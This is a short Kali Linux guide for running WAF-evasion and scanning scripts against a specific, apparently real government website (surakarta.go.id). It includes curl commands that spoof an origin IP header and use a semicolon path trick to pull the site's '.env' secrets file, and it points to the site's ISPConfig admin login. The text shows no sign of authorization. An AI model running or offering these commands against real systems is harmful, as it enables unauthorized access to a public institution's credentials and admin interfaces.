# Testing Guide: Surakarta WAF Evasion on Kali Linux

This guide details how to install and test the advanced WAF evasion capabilities of `sqlmapauto` and `surakarta_hunter` on your Kali Linux machine.

## 1. Setup Environment
First, update your local repository and install necessary dependencies.

```bash
# Update Repository
cd sqlmapauto
git pull

# Install Dependencies (Use --break-system-packages if pip is restricted)
pip install requests pysocks --break-system-packages
```

## 2. Test WAF Evasion via `waf_evader.py`
This script attempts multiple advanced evasion techniques (Junk Header, Method Tampering, etc.) specifically targeting the `.env` file.

**Command:**
```bash
python3 waf_evader.py
```

**Expected Output:**
- Look for `[!!!] BYPASS SUCCESS`.
- If you see `200 OK` but followed by "Redirecting...", it means the WAF is still intercepting but returning a fake success page.

## 3. Test Full Site vulnerability Scan (`surakarta_hunter.py`)
This tool scans for exposed Admin Panels and Config files using the "Semicolon Bypass" technique (`/.env;`).

**Command:**
```bash
python3 surakarta_hunter.py
```

**What to Look For:**
- **[!!!] VULNERABLE! Found ISPConfig Admin Panel (200 OK)** -> Open link in browser!
- **[!!!] VULNERABLE! Found Exposed Upload Directory** -> Critical listing access.
- **Found Laravel Config (200 OK)** -> Verify if it's a redirect or actual content using `curl`.

## 4. Manual Verification (The Ultimate Test)
If the automated tools show a potential bypass, verifying it manually with `curl` is the gold standard.

**Verify .env Bypass:**
```bash
curl -k -s -I -H "X-Originating-IP: 127.0.0.1" "https://surakarta.go.id/.env;"
```
*(Check if response is 200 OK and Content-Type is `text/plain` or similar, NOT `text/html` redirect)*.

**Verify ISPConfig Panel:**
```bash
curl -k -s -I "https://surakarta.go.id:8080/login/"
```
*(Should return 200 OK)*.
